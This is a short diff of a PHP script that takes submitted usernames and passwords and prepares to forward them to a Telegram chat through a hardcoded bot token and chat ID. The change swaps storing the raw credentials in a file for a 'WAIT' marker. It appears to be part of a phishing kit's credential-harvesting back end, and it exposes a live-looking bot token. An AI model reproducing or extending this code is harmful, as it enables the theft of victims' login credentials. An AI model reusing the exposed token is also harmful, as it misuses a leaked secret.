@@ -28,9 +28,9 @@ $file = $dir . $id . ".txt";
 
 if($usuario && $clave){
 
- if(!file_exists($file)){
+if(!file_exists($file) || trim(file_get_contents($file)) === "WAIT"){
         
-        file_put_contents($file, "$usuario|$clave", LOCK_EX);
+      file_put_contents($file, "WAIT", LOCK_EX);
 
         $token = "8687740380:AAGGYi6lL882l7Vv6JSYJwkFPZ1byk0pcRA";
         $chat_id = "8448767308";
